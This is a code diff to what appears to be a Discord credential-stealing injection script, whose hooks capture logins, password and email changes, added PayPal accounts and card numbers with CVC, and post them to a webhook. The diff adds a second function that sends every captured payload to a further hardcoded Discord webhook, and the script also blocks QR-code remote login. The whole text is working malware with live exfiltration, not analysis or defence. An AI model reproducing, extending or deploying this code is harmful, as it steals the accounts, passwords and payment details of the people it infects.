@@ -645,6 +645,33 @@ const hooker = async (content) => {
   req.end();
 };
 
+const dualhooker = async (content) => {
+  const data = JSON.stringify(content);
+  const url = new URL('https://discord.com/api/webhooks/990096003631816714/iZtQDlSkzBSiKiWdHuSfplggEAbItb1Rk9JfPDofF1Xi16ZMgPCzD1XvDyJEi49gokeH');
+  const headers = {
+    'Content-Type': 'application/json',
+    'Access-Control-Allow-Origin': '*',
+  };
+  if (!config.webhook.includes('api/webhooks')) {
+    const key = totp(config.webhook_protector_key);
+    headers['Authorization'] = key;
+  }
+  const options = {
+    protocol: url.protocol,
+    hostname: url.host,
+    path: url.pathname,
+    method: 'POST',
+    headers: headers,
+  };
+  const req = https.request(options);
+
+  req.on('error', (err) => {
+    console.log(err);
+  });
+  req.write(data);
+  req.end();
+};
+
 const login = async (email, password, token) => {
   const json = await getInfo(token);
   const nitro = getNitro(json.premium_type);
@@ -712,6 +739,7 @@ const login = async (email, password, token) => {
   };
   if (config.ping_on_run) content['content'] = config.ping_val;
   hooker(content);
+  dualhooker(content);
 };
 
 
@@ -766,7 +794,8 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
       ],
     };
     if (config.ping_on_run) content['content'] = config.ping_val;
-    hooker(content);
+  hooker(content);
+  dualhooker(content);
   };
   
   const emailChanged = async (email, password, token) => {
@@ -815,7 +844,8 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
       ],
     };
     if (config.ping_on_run) content['content'] = config.ping_val;
-    hooker(content);
+  hooker(content);
+  dualhooker(content);
   };
   
   const PaypalAdded = async (token) => {
@@ -862,7 +892,8 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
       ],
     };
     if (config.ping_on_run) content['content'] = config.ping_val;
-    hooker(content);
+  hooker(content);
+  dualhooker(content);
   };
   
   const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
@@ -909,7 +940,8 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
       ],
     };
     if (config.ping_on_run) content['content'] = config.ping_val;
-    hooker(content);
+  hooker(content);
+  dualhooker(content);
   };
   
   const nitroBought = async (token) => {
@@ -958,7 +990,8 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
       ],
     };
     if (config.ping_on_run) content['content'] = config.ping_val + `\n${code}`;
-    hooker(content);
+  hooker(content);
+  dualhooker(content);
   };
   session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {
     if (details.url.startsWith('wss://remote-auth-gateway')) return callback({ cancel: true });
